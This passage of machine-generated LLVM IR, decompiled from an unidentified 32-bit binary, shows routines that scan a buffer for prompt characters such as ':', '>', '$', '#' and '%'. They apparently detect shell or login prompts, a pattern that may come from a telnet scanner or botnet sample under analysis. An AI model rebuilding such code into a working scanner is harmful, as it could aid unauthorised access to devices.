  %v10_80507ab = icmp eq i8 %v5_805078c, 35
  br i1 %v10_80507ab, label %dec_label_pc_8050cff, label %dec_label_pc_80507b4

dec_label_pc_80507b4:                             ; preds = %dec_label_pc_80507ab
  %v10_80507b4 = icmp eq i8 %v5_805078c, 37
  br i1 %v10_80507b4, label %dec_label_pc_8050cff, label %dec_label_pc_80507bd

dec_label_pc_80507bd:                             ; preds = %dec_label_pc_80507b4
  %v1_80507bd = add i32 %v0_8050cff, -1
  %v8_80507bd = icmp eq i32 %v1_80507bd, 0
  store i32 %v1_80507bd, i32* %eax.global-to-local, align 4
  %v1_80507be = icmp eq i1 %v8_80507bd, false
  br i1 %v1_80507be, label %dec_label_pc_805078c, label %dec_label_pc_8050583.backedge

dec_label_pc_80507c5:                             ; preds = %dec_label_pc_80505f5
  %v1_80507c5 = add i32 %v0_80505f5, 24
  %v2_80507c5 = inttoptr i32 %v1_80507c5 to i32*
  %v3_80507c5 = load i32, i32* %v2_80507c5, align 4
  %v1_80507c8 = add i32 %v3_80507c5, -1
  store i32 %v1_80507c8, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v1_80507c8, 1
  br i1 %tmp142, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_80507d1.preheader

dec_label_pc_80507d1.preheader:                   ; preds = %dec_label_pc_80507c5
  %v7_80507d1.pre = load i32, i32* @edx, align 4
  %v2_80507d1 = add i32 %v0_80505f5, 28
  br label %dec_label_pc_80507d1

dec_label_pc_80507d1:                             ; preds = %dec_label_pc_80507d1.preheader, %dec_label_pc_8050802
  %v7_80507d1 = phi i32 [ %v7_80507d1.pre, %dec_label_pc_80507d1.preheader ], [ %v9_80507d1, %dec_label_pc_8050802 ]
  %v0_8050c0d = phi i32 [ %v1_80507c8, %dec_label_pc_80507d1.preheader ], [ %v1_8050802, %dec_label_pc_8050802 ]
  %v3_80507d1 = add i32 %v2_80507d1, %v0_8050c0d
  %v4_80507d1 = inttoptr i32 %v3_80507d1 to i8*
  %v5_80507d1 = load i8, i8* %v4_80507d1, align 1
  %v6_80507d1 = zext i8 %v5_80507d1 to i32
  %v8_80507d1 = and i32 %v7_80507d1, -256
  %v9_80507d1 = or i32 %v6_80507d1, %v8_80507d1
  store i32 %v9_80507d1, i32* %edx.global-to-local, align 4
  %v10_80507d5 = icmp eq i8 %v5_80507d1, 58
  br i1 %v10_80507d5, label %dec_label_pc_8050c0d, label %dec_label_pc_80507de

dec_label_pc_80507de:                             ; preds = %dec_label_pc_80507d1
  %v10_80507de = icmp eq i8 %v5_80507d1, 62
  br i1 %v10_80507de, label %dec_label_pc_8050c0d, label %dec_label_pc_80507e7

dec_label_pc_80507e7:                             ; preds = %dec_label_pc_80507de
  %v10_80507e7 = icmp eq i8 %v5_80507d1, 36
  br i1 %v10_80507e7, label %dec_label_pc_8050c0d, label %dec_label_pc_80507f0

dec_label_pc_80507f0:                             ; preds = %dec_label_pc_80507e7
  %v10_80507f0 = icmp eq i8 %v5_80507d1, 35
  br i1 %v10_80507f0, label %dec_label_pc_8050c0d, label %dec_label_pc_80507f9

dec_label_pc_80507f9:                             ; preds = %dec_label_pc_80507f0
  %v10_80507f9 = icmp eq i8 %v5_80507d1, 37
  br i1 %v10_80507f9, label %dec_label_pc_8050c0d, label %dec_label_pc_8050802

dec_label_pc_8050802:                             ; preds = %dec_label_pc_80507f9
  %v1_8050802 = add i32 %v0_8050c0d, -1
  %v8_8050802 = icmp eq i32 %v1_8050802, 0
  store i32 %v1_8050802, i32* %eax.global-to-local, align 4
  %v1_8050803 = icmp eq i1 %v8_8050802, false
  br i1 %v1_8050803, label %dec_label_pc_80507d1, label %dec_label_pc_8050583.backedge

dec_label_pc_8050810:                             ; preds = %dec_label_pc_80505f5
  %v0_8050810 = load i32, i32* @esp, align 4
  %v1_8050813 = add i32 %v0_8050810, -16
  %v2_8050813 = inttoptr i32 %v1_8050813 to i32*
  store i32 26, i32* %v2_8050813, align 4
  %v2_8050815 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050815, i32* %eax.global-to-local, align 4
  %v0_805081a = load i32, i32* @esp, align 4
  %v1_805081a = inttoptr i32 %v0_805081a to i32*
  %v2_805081a = load i32, i32* %v1_805081a, align 4
  store i32 %v2_805081a, i32* %eax.global-to-local, align 4
  %v3_805081a = add i32 %v0_805081a, 4
  %v1_805081b = inttoptr i32 %v3_805081a to i32*
  %v2_805081b = load i32, i32* %v1_805081b, align 4
  store i32 %v2_805081b, i32* %edx.global-to-local, align 4
  %v1_805081c = add i32 %v0_805081a, 1880
  store i32 %v1_805081c, i32* %ecx.global-to-local, align 4
  store i32 %v1_805081c, i32* %v1_805081b, align 4
  store i32 26, i32* %v1_805081a, align 4
  %v3_8050826 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050826, i32* %eax.global-to-local, align 4
  %v0_805082b = load i32, i32* @esp, align 4
  %v1_805082b = add i32 %v0_805082b, 1880
  %v2_805082b = inttoptr i32 %v1_805082b to i32*
  %v3_805082b = load i32, i32* %v2_805082b, align 4
  %v1_8050832 = add i32 %v3_805082b, -1
  store i32 %v1_8050832, i32* %edx.global-to-local, align 4
  %v2_8050833 = add i32 %v0_805082b, -4
  %v3_8050833 = inttoptr i32 %v2_8050833 to i32*
  store i32 %v1_8050832, i32* %v3_8050833, align 4
  %v2_8050834 = add i32 %v0_805082b, -8
  %v3_8050834 = inttoptr i32 %v2_8050834 to i32*
  store i32 %v3_8050826, i32* %v3_8050834, align 4
  %v0_8050835 = load i32, i32* @edi, align 4
  %v1_8050835 = add i32 %v0_8050835, 24
  %v2_8050835 = inttoptr i32 %v1_8050835 to i32*
  %v3_8050835 = load i32, i32* %v2_8050835, align 4
  store i32 %v3_8050835, i32* %eax.global-to-local, align 4
  %v2_8050838 = add i32 %v0_805082b, -12
  %v3_8050838 = inttoptr i32 %v2_8050838 to i32*
  store i32 %v3_8050835, i32* %v3_8050838, align 4
  %v1_8050839 = add i32 %v0_805082b, 32
  %v2_8050839 = inttoptr i32 %v1_8050839 to i32*
  %v3_8050839 = load i32, i32* %v2_8050839, align 4
  store i32 %v3_8050839, i32* %eax.global-to-local, align 4
  %v2_805083d = add i32 %v0_805082b, -16
  %v3_805083d = inttoptr i32 %v2_805083d to i32*
  store i32 %v3_8050839, i32* %v3_805083d, align 4
  %v0_805083e = call i32 @function_8051ca0()
  %v0_8050843 = load i32, i32* @esp, align 4
  %v1_8050846 = add i32 %v0_805083e, 1
  %v8_8050846 = icmp eq i32 %v1_8050846, 0
  store i32 %v1_8050846, i32* %eax.global-to-local, align 4
  %v1_8050847 = icmp eq i1 %v8_8050846, false
  %v1_8050df4 = add i32 %v0_8050843, 16
  %v2_8050df4 = inttoptr i32 %v1_8050df4 to i32*
  store i32 26, i32* %v2_8050df4, align 4
  %v2_8050df6 = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050df6, i32* %eax.global-to-local, align 4
  %v0_8050dfb = load i32, i32* @esp, align 4
  %v1_8050dfb = inttoptr i32 %v0_8050dfb to i32*
  br i1 %v1_8050847, label %dec_label_pc_8050df1, label %dec_label_pc_805084d

dec_label_pc_805084d:                             ; preds = %dec_label_pc_8050810
  store i32 25, i32* %v1_8050dfb, align 4
  %v2_805085e = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805085e, i32* %eax.global-to-local, align 4
  %v0_8050863 = load i32, i32* @esp, align 4
  %v1_8050863 = inttoptr i32 %v0_8050863 to i32*
  %v3_8050863 = add i32 %v0_8050863, 4
  %v1_8050864 = inttoptr i32 %v3_8050863 to i32*
  %v1_8050865 = add i32 %v0_8050863, 1880
  store i32 %v1_8050865, i32* %eax.global-to-local, align 4
  store i32 %v1_8050865, i32* %v1_8050864, align 4
  store i32 25, i32* %v1_8050863, align 4
  %v3_805086f = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805086f, i32* %eax.global-to-local, align 4
  %v0_8050874 = load i32, i32* @esp, align 4
  %v1_8050874 = add i32 %v0_8050874, 1880
  %v2_8050874 = inttoptr i32 %v1_8050874 to i32*
  %v3_8050874 = load i32, i32* %v2_8050874, align 4
  %v1_805087b = add i32 %v3_8050874, -1
  store i32 %v1_805087b, i32* %edx.global-to-local, align 4
  %v2_805087c = add i32 %v0_8050874, -4
  %v3_805087c = inttoptr i32 %v2_805087c to i32*
  store i32 %v1_805087b, i32* %v3_805087c, align 4
  %v2_805087d = add i32 %v0_8050874, -8
  %v3_805087d = inttoptr i32 %v2_805087d to i32*
  store i32 %v3_805086f, i32* %v3_805087d, align 4
  %v0_805087e = load i32, i32* @edi, align 4
  %v1_805087e = add i32 %v0_805087e, 24
  %v2_805087e = inttoptr i32 %v1_805087e to i32*
  %v3_805087e = load i32, i32* %v2_805087e, align 4
  store i32 %v3_805087e, i32* @esi, align 4
  %v2_8050881 = add i32 %v0_8050874, -12
  %v3_8050881 = inttoptr i32 %v2_8050881 to i32*
  store i32 %v3_805087e, i32* %v3_8050881, align 4
  %v1_8050882 = add i32 %v0_8050874, 32
  %v2_8050882 = inttoptr i32 %v1_8050882 to i32*
  %v3_8050882 = load i32, i32* %v2_8050882, align 4
  store i32 %v3_8050882, i32* @ebx, align 4
  %v2_8050886 = add i32 %v0_8050874, -16
  %v3_8050886 = inttoptr i32 %v2_8050886 to i32*
  store i32 %v3_8050882, i32* %v3_8050886, align 4
  %v0_8050887 = call i32 @function_8051ca0()
  store i32 %v0_8050887, i32* %eax.global-to-local, align 4
  %v0_805088c = load i32, i32* @esp, align 4
  store i32 %v0_8050887, i32* @ebp, align 4
  %v1_8050891 = add i32 %v0_805088c, 16
  %v2_8050891 = inttoptr i32 %v1_8050891 to i32*
  store i32 25, i32* %v2_8050891, align 4
  %v2_8050893 = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050893, i32* %eax.global-to-local, align 4
  %v0_8050898 = load i32, i32* @esp, align 4
  %v0_805089b = load i32, i32* @ebp, align 4
  %v10_805089b = icmp eq i32 %v0_805089b, -1
  br i1 %v10_805089b, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_80508a4

dec_label_pc_80508a4:                             ; preds = %dec_label_pc_805084d
  %tmp143 = icmp slt i32 %v0_805089b, 1
  br i1 %tmp143, label %dec_label_pc_8050a23, label %dec_label_pc_80508ac

dec_label_pc_80508ac:                             ; preds = %dec_label_pc_80508a4
  %v0_80508ac = load i32, i32* @edi, align 4
  %v1_80508ac = inttoptr i32 %v0_80508ac to i32*
  %v2_80508ac = load i32, i32* %v1_80508ac, align 4
  store i32 %v2_80508ac, i32* %edx.global-to-local, align 4
  %v1_80508ae = add i32 %v0_80508ac, 16
  %v2_80508ae = inttoptr i32 %v1_80508ae to i32*
  %v3_80508ae = load i32, i32* %v2_80508ae, align 4
  store i32 %v3_80508ae, i32* %eax.global-to-local, align 4
  %v2_80508b1 = add i32 %v0_8050898, 52
  %v3_80508b1 = inttoptr i32 %v2_80508b1 to i32*
  store i32 %v2_80508ac, i32* %v3_80508b1, align 4
  %v0_80508b5 = load i32, i32* @edi, align 4
  %v1_80508b5 = add i32 %v0_80508b5, 20
  %v2_80508b5 = inttoptr i32 %v1_80508b5 to i32*
  %v3_80508b5 = load i32, i32* %v2_80508b5, align 4
  store i32 %v3_80508b5, i32* %edx.global-to-local, align 4
  %v0_80508b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508b8 = load i32, i32* @esp, align 4
  %v2_80508b8 = add i32 %v1_80508b8, 1872
  %v3_80508b8 = inttoptr i32 %v2_80508b8 to i32*
  store i32 %v0_80508b8, i32* %v3_80508b8, align 4
  %v0_80508bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80508bf = trunc i32 %v0_80508bf to i16
  %v2_80508bf = load i32, i32* @esp, align 4
  %v3_80508bf = add i32 %v2_80508bf, 1882
  %v4_80508bf = inttoptr i32 %v3_80508bf to i16*
  store i16 %v1_80508bf, i16* %v4_80508bf, align 2
  %v0_80508c7 = call i32 @function_80521bf()
  store i32 %v0_80508c7, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_80508c7, 1
  br i1 %tmp144, label %dec_label_pc_805102e, label %dec_label_pc_80508d4

dec_label_pc_80508d4:                             ; preds = %dec_label_pc_805104f, %dec_label_pc_805102e, %dec_label_pc_80508ac
  %v0_80508d4 = load i32, i32* @esp, align 4
  %v0_80508d7 = load i32, i32* @edi, align 4
  %v1_80508d7 = add i32 %v0_80508d7, 4
  %v2_80508d7 = inttoptr i32 %v1_80508d7 to i32*
  %v3_80508d7 = load i32, i32* %v2_80508d7, align 4
  store i32 %v3_80508d7, i32* @esi, align 4
  %v2_80508da = add i32 %v0_80508d4, -16
  %v3_80508da = inttoptr i32 %v2_80508da to i32*
  store i32 %v3_80508d7, i32* %v3_80508da, align 4
  %v1_80508db = call i32 @function_8052191(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80508db, i32* %eax.global-to-local, align 4
  %v0_80508e0 = load i32, i32* @edi, align 4
  %v1_80508e0 = add i32 %v0_80508e0, 4
  %v2_80508e0 = inttoptr i32 %v1_80508e0 to i32*
  store i32 -1, i32* %v2_80508e0, align 4
  %v0_80508e7 = load i32, i32* @edi, align 4
  %v1_80508e7 = add i32 %v0_80508e7, 12
  %v2_80508e7 = inttoptr i32 %v1_80508e7 to i32*
  store i32 0, i32* %v2_80508e7, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_80508f1:                             ; preds = %dec_label_pc_8050a23, %dec_label_pc_8050c9a, %dec_label_pc_805096e, %dec_label_pc_8050fb0, %dec_label_pc_8050e24, %dec_label_pc_8050c21, %dec_label_pc_8050d13, %dec_label_pc_8050bcf, %dec_label_pc_8050b7e, %dec_label_pc_805068c, %dec_label_pc_8050d8c, %dec_label_pc_80508d4
  %v0_80508f1 = load i32, i32* @edi, align 4
  %v1_80508f1 = add i32 %v0_80508f1, 24
  %v2_80508f1 = inttoptr i32 %v1_80508f1 to i32*
  %v3_80508f1 = load i32, i32* %v2_80508f1, align 4
  store i32 %v3_80508f1, i32* @edx, align 4
  store i32 %v3_80508f1, i32* %eax.global-to-local, align 4
  %v1_80508f6 = load i32, i32* @ebp, align 4
  %v2_80508f6 = sub i32 %v3_80508f1, %v1_80508f6
  %v8_80508f6 = xor i32 %v1_80508f6, %v3_80508f1
  %v9_80508f6 = xor i32 %v2_80508f6, %v3_80508f1
  %v10_80508f6 = and i32 %v9_80508f6, %v8_80508f6
  %v11_80508f6 = icmp slt i32 %v10_80508f6, 0
  %v12_80508f6 = icmp eq i32 %v2_80508f6, 0
  %v13_80508f6 = icmp slt i32 %v2_80508f6, 0
  %v3_80508f8 = icmp ne i1 %v13_80508f6, %v11_80508f6
  %v4_80508f8 = or i1 %v12_80508f6, %v3_80508f8
  br i1 %v4_80508f8, label %dec_label_pc_80508fc, label %dec_label_pc_80508fa

dec_label_pc_80508fa:                             ; preds = %dec_label_pc_80508f1
  store i32 %v1_80508f6, i32* @edx, align 4
  br label %dec_label_pc_80508fc

dec_label_pc_80508fc:                             ; preds = %dec_label_pc_80508f1, %dec_label_pc_80508fa
  %v1_80508fc = phi i32 [ %v3_80508f1, %dec_label_pc_80508f1 ], [ %v1_80508f6, %dec_label_pc_80508fa ]
  %v2_80508fc = sub i32 %v3_80508f1, %v1_80508fc
  store i32 %v2_80508fc, i32* %eax.global-to-local, align 4
  store i32 %v2_80508fc, i32* %v2_80508f1, align 4
  %v0_8050901 = load i32, i32* @ebx, align 4
  %v1_8050901 = load i32, i32* @esp, align 4
  %v2_8050901 = add i32 %v1_8050901, -4
  %v3_8050901 = inttoptr i32 %v2_8050901 to i32*
  store i32 %v0_8050901, i32* %v3_8050901, align 4
  %v0_8050902 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050902 = add i32 %v1_8050901, -8
  %v3_8050902 = inttoptr i32 %v2_8050902 to i32*
  store i32 %v0_8050902, i32* %v3_8050902, align 4
  %v1_8050903 = add i32 %v1_8050901, 16
  %v2_8050903 = inttoptr i32 %v1_8050903 to i32*
  %v3_8050903 = load i32, i32* %v2_8050903, align 4
  %v1_8050907 = load i32, i32* @edx, align 4
  %v2_8050907 = add i32 %v1_8050907, %v3_8050903
  store i32 %v2_8050907, i32* %eax.global-to-local, align 4
  %v2_8050909 = add i32 %v1_8050901, -12
  %v3_8050909 = inttoptr i32 %v2_8050909 to i32*
  store i32 %v2_8050907, i32* %v3_8050909, align 4
  %v3_805090a = load i32, i32* %v2_8050903, align 4
  store i32 %v3_805090a, i32* %ecx.global-to-local, align 4
  %v2_805090e = add i32 %v1_8050901, -16
  %v3_805090e = inttoptr i32 %v2_805090e to i32*
  store i32 %v3_805090a, i32* %v3_805090e, align 4
  %v4_805090f = call i32 @function_80526f3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805090f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80505f5

dec_label_pc_805091c:                             ; preds = %dec_label_pc_80505f5
  %v1_805091c = add i32 %v0_80505f5, 24
  %v2_805091c = inttoptr i32 %v1_805091c to i32*
  %v3_805091c = load i32, i32* %v2_805091c, align 4
  %v1_805091f = add i32 %v3_805091c, -1
  store i32 %v1_805091f, i32* %eax.global-to-local, align 4
  %tmp145 = icmp slt i32 %v1_805091f, 1
  br i1 %tmp145, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_8050928

dec_label_pc_8050928:                             ; preds = %dec_label_pc_805091c
  %v2_8050928 = add i32 %v0_80505f5, 27
  %v3_8050928 = add i32 %v2_8050928, %v3_805091c
  %v4_8050928 = inttoptr i32 %v3_8050928 to i8*
  %v5_8050928 = load i8, i8* %v4_8050928, align 1
  %v6_8050928 = zext i8 %v5_8050928 to i32
  %v7_8050928 = load i32, i32* @edx, align 4
  %v8_8050928 = and i32 %v7_8050928, -256
  %v9_8050928 = or i32 %v8_8050928, %v6_8050928
  store i32 %v9_8050928, i32* %edx.global-to-local, align 4
  %v10_805092c = icmp eq i8 %v5_8050928, 62
  br i1 %v10_805092c, label %dec_label_pc_805095a.thread, label %dec_label_pc_8050931

dec_label_pc_8050931:                             ; preds = %dec_label_pc_8050928
  %v10_8050931 = icmp eq i8 %v5_8050928, 58
  br i1 %v10_8050931, label %dec_label_pc_805095a.thread, label %dec_label_pc_8050936

dec_label_pc_8050936:                             ; preds = %dec_label_pc_8050931, %dec_label_pc_8050955
  %v0_8050945 = phi i32 [ %v1_8050945, %dec_label_pc_8050955 ], [ %v1_805091f, %dec_label_pc_8050931 ]
  %v7_805094c = phi i32 [ %v9_805094c, %dec_label_pc_8050955 ], [ %v9_8050928, %dec_label_pc_8050931 ]
  %v1_8050936 = trunc i32 %v7_805094c to i8
  %v10_8050936 = icmp eq i8 %v1_8050936, 36
  br i1 %v10_8050936, label %dec_label_pc_805095a, label %dec_label_pc_805093b

dec_label_pc_805093b:                             ; preds = %dec_label_pc_8050936
  %v10_805093b = icmp eq i8 %v1_8050936, 35
  br i1 %v10_805093b, label %dec_label_pc_805095a, label %dec_label_pc_8050940

dec_label_pc_8050940:                             ; preds = %dec_label_pc_805093b
  %v10_8050940 = icmp eq i8 %v1_8050936, 37
  br i1 %v10_8050940, label %dec_label_pc_805095a, label %dec_label_pc_8050945

dec_label_pc_8050945:                             ; preds = %dec_label_pc_8050940
  %v1_8050945 = add i32 %v0_8050945, -1
  %v8_8050945 = icmp eq i32 %v1_8050945, 0
  store i32 %v1_8050945, i32* %eax.global-to-local, align 4
  br i1 %v8_8050945, label %dec_label_pc_8050583.backedge, label %dec_label_pc_805094c

dec_label_pc_805094c:                             ; preds = %dec_label_pc_8050945
  %v3_805094c = add i32 %v2_8050928, %v0_8050945
  %v4_805094c = inttoptr i32 %v3_805094c to i8*
  %v5_805094c = load i8, i8* %v4_805094c, align 1
  %v6_805094c = zext i8 %v5_805094c to i32
  %v8_805094c = and i32 %v7_805094c, -256
  %v9_805094c = or i32 %v6_805094c, %v8_805094c
  store i32 %v9_805094c, i32* %edx.global-to-local, align 4
  %v10_8050950 = icmp eq i8 %v5_805094c, 58
  br i1 %v10_8050950, label %dec_label_pc_805095a, label %dec_label_pc_8050955

dec_label_pc_8050955:                             ; preds = %dec_label_pc_805094c
  %v10_8050955 = icmp eq i8 %v5_805094c, 62
  %v1_8050958 = icmp eq i1 %v10_8050955, false
  br i1 %v1_8050958, label %dec_label_pc_8050936, label %dec_label_pc_805095a

dec_label_pc_805095a.thread:                      ; preds = %dec_label_pc_8050931, %dec_label_pc_8050928
  store i32 %v3_805091c, i32* @ebp, align 4
  br label %dec_label_pc_8050966

dec_label_pc_805095a:                             ; preds = %dec_label_pc_8050955, %dec_label_pc_805094c, %dec_label_pc_8050940, %dec_label_pc_805093b, %dec_label_pc_8050936
  %v0_805095a = phi i32 [ %v0_8050945, %dec_label_pc_8050936 ], [ %v0_8050945, %dec_label_pc_805093b ], [ %v0_8050945, %dec_label_pc_8050940 ], [ %v1_8050945, %dec_label_pc_805094c ], [ %v1_8050945, %dec_label_pc_8050955 ]
  %v1_805095a = add i32 %v0_805095a, 1
  store i32 %v1_805095a, i32* @ebp, align 4
  %v10_805095d = icmp eq i32 %v0_805095a, -2
  br i1 %v10_805095d, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_8050966

dec_label_pc_8050966:                             ; preds = %dec_label_pc_805095a.thread, %dec_label_pc_805095a
  %v1_805095a160 = phi i32 [ %v3_805091c, %dec_label_pc_805095a.thread ], [ %v1_805095a, %dec_label_pc_805095a ]
  %tmp146 = icmp slt i32 %v1_805095a160, 1
  br i1 %tmp146, label %dec_label_pc_8050a23, label %dec_label_pc_805096e

dec_label_pc_805096e:                             ; preds = %dec_label_pc_8050966
  %v0_805096e = load i32, i32* @esp, align 4
  %v1_8050971 = add i32 %v0_805096e, -16
  %v2_8050971 = inttoptr i32 %v1_8050971 to i32*
  store i32 20, i32* %v2_8050971, align 4
  %v2_8050973 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050973, i32* %eax.global-to-local, align 4
  %v0_8050978 = load i32, i32* @esp, align 4
  %v1_8050978 = inttoptr i32 %v0_8050978 to i32*
  %v2_8050978 = load i32, i32* %v1_8050978, align 4
  store i32 %v2_8050978, i32* %eax.global-to-local, align 4
  %v3_8050978 = add i32 %v0_8050978, 4
  %v1_8050979 = inttoptr i32 %v3_8050978 to i32*
  %v2_8050979 = load i32, i32* %v1_8050979, align 4
  store i32 %v2_8050979, i32* %edx.global-to-local, align 4
  %v1_805097a = add i32 %v0_8050978, 1888
  store i32 %v1_805097a, i32* %eax.global-to-local, align 4
  store i32 %v1_805097a, i32* %v1_8050979, align 4
  store i32 20, i32* %v1_8050978, align 4
  %v3_8050984 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050984, i32* %eax.global-to-local, align 4
  %v0_8050989 = load i32, i32* @esp, align 4
  %v1_8050989 = add i32 %v0_8050989, -4
  %v2_8050989 = inttoptr i32 %v1_8050989 to i32*
  store i32 16384, i32* %v2_8050989, align 4
  %v1_805098e = add i32 %v0_8050989, 1888
  %v2_805098e = inttoptr i32 %v1_805098e to i32*
  %v3_805098e = load i32, i32* %v2_805098e, align 4
  store i32 %v3_805098e, i32* @esi, align 4
  %v2_8050995 = add i32 %v0_8050989, -8
  %v3_8050995 = inttoptr i32 %v2_8050995 to i32*
  store i32 %v3_805098e, i32* %v3_8050995, align 4
  %v2_8050996 = add i32 %v0_8050989, -12
  %v3_8050996 = inttoptr i32 %v2_8050996 to i32*
  store i32 %v3_8050984, i32* %v3_8050996, align 4
  %v0_8050997 = load i32, i32* @edi, align 4
  %v1_8050997 = add i32 %v0_8050997, 4
  %v2_8050997 = inttoptr i32 %v1_8050997 to i32*
  %v3_8050997 = load i32, i32* %v2_8050997, align 4
  store i32 %v3_8050997, i32* @ebx, align 4
  %v2_805099a = add i32 %v0_8050989, -16
  %v3_805099a = inttoptr i32 %v2_805099a to i32*
  store i32 %v3_8050997, i32* %v3_805099a, align 4
  %v0_805099b = call i32 @function_80528d4()
  store i32 %v0_805099b, i32* %eax.global-to-local, align 4
  %v0_80509a0 = load i32, i32* @esp, align 4
  %v1_80509a3 = add i32 %v0_80509a0, 28
  %v2_80509a3 = inttoptr i32 %v1_80509a3 to i32*
  store i32 16384, i32* %v2_80509a3, align 4
  %v1_80509a8 = add i32 %v0_80509a0, 24
  %v2_80509a8 = inttoptr i32 %v1_80509a8 to i32*
  store i32 2, i32* %v2_80509a8, align 4
  %v1_80509aa = add i32 %v0_80509a0, 20
  %v2_80509aa = inttoptr i32 %v1_80509aa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_80509aa, align 4
  %v0_80509af = load i32, i32* @edi, align 4
  %v1_80509af = add i32 %v0_80509af, 4
  %v2_80509af = inttoptr i32 %v1_80509af to i32*
  %v3_80509af = load i32, i32* %v2_80509af, align 4
  store i32 %v3_80509af, i32* %ecx.global-to-local, align 4
  %v2_80509b2 = add i32 %v0_80509a0, 16
  %v3_80509b2 = inttoptr i32 %v2_80509b2 to i32*
  store i32 %v3_80509af, i32* %v3_80509b2, align 4
  %v0_80509b3 = call i32 @function_80528d4()
  store i32 %v0_80509b3, i32* %eax.global-to-local, align 4
  %v0_80509b8 = load i32, i32* @esp, align 4
  %v1_80509b8 = inttoptr i32 %v0_80509b8 to i32*
  store i32 20, i32* %v1_80509b8, align 4
  %v2_80509bf = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80509bf, i32* %eax.global-to-local, align 4
  %v0_80509c7 = load i32, i32* @edi, align 4
  %v1_80509c7 = add i32 %v0_80509c7, 12
  %v2_80509c7 = inttoptr i32 %v1_80509c7 to i32*
  store i32 8, i32* %v2_80509c7, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_80509d3:                             ; preds = %dec_label_pc_80505f5
  %v1_80509d3 = add i32 %v0_80505f5, 24
  %v2_80509d3 = inttoptr i32 %v1_80509d3 to i32*
  %v3_80509d3 = load i32, i32* %v2_80509d3, align 4
  %v1_80509d6 = add i32 %v3_80509d3, -1
  store i32 %v1_80509d6, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_80509d6, 1
  br i1 %tmp147, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_80509df.preheader

dec_label_pc_80509df.preheader:                   ; preds = %dec_label_pc_80509d3
  %v7_80509df.pre = load i32, i32* @edx, align 4
  %v2_80509df = add i32 %v0_80505f5, 28
  br label %dec_label_pc_80509df

dec_label_pc_80509df:                             ; preds = %dec_label_pc_80509df.preheader, %dec_label_pc_8050a10
  %v7_80509df = phi i32 [ %v7_80509df.pre, %dec_label_pc_80509df.preheader ], [ %v9_80509df, %dec_label_pc_8050a10 ]
  %v0_8050c86 = phi i32 [ %v1_80509d6, %dec_label_pc_80509df.preheader ], [ %v1_8050a10, %dec_label_pc_8050a10 ]
  %v3_80509df = add i32 %v2_80509df, %v0_8050c86
  %v4_80509df = inttoptr i32 %v3_80509df to i8*
  %v5_80509df = load i8, i8* %v4_80509df, align 1
  %v6_80509df = zext i8 %v5_80509df to i32
  %v8_80509df = and i32 %v7_80509df, -256
  %v9_80509df = or i32 %v6_80509df, %v8_80509df
  store i32 %v9_80509df, i32* %edx.global-to-local, align 4
  %v10_80509e3 = icmp eq i8 %v5_80509df, 58
  br i1 %v10_80509e3, label %dec_label_pc_8050c86, label %dec_label_pc_80509ec

dec_label_pc_80509ec:                             ; preds = %dec_label_pc_80509df
  %v10_80509ec = icmp eq i8 %v5_80509df, 62
  br i1 %v10_80509ec, label %dec_label_pc_8050c86, label %dec_label_pc_80509f5

dec_label_pc_80509f5:                             ; preds = %dec_label_pc_80509ec
  %v10_80509f5 = icmp eq i8 %v5_80509df, 36
  br i1 %v10_80509f5, label %dec_label_pc_8050c86, label %dec_label_pc_80509fe

dec_label_pc_80509fe:                             ; preds = %dec_label_pc_80509f5
  %v10_80509fe = icmp eq i8 %v5_80509df, 35
  br i1 %v10_80509fe, label %dec_label_pc_8050c86, label %dec_label_pc_8050a07

dec_label_pc_8050a07:                             ; preds = %dec_label_pc_80509fe
  %v10_8050a07 = icmp eq i8 %v5_80509df, 37
  br i1 %v10_8050a07, label %dec_label_pc_8050c86, label %dec_label_pc_8050a10

dec_label_pc_8050a10:                             ; preds = %dec_label_pc_8050a07
  %v1_8050a10 = add i32 %v0_8050c86, -1
  %v8_8050a10 = icmp eq i32 %v1_8050a10, 0
  store i32 %v1_8050a10, i32* %eax.global-to-local, align 4
  %v1_8050a11 = icmp eq i1 %v8_8050a10, false
  br i1 %v1_8050a11, label %dec_label_pc_80509df, label %dec_label_pc_8050583.backedge

dec_label_pc_8050a18:                             ; preds = %dec_label_pc_8050624
  %v1_8050a18 = add i32 %v0_8050612, 2
  store i32 %v1_8050a18, i32* @ebx, align 4
  %v1_8050a1b = add i32 %v0_8050a1b, 2
  store i32 %v1_8050a1b, i32* @ebp, align 4
  br label %dec_label_pc_805060e.backedge

dec_label_pc_805060e.backedge:                    ; preds = %dec_label_pc_8050a18, %dec_label_pc_8050e3a
  %v0_805068c128 = phi i32 [ %v0_805068c129, %dec_label_pc_8050a18 ], [ %v0_8050e73, %dec_label_pc_8050e3a ]
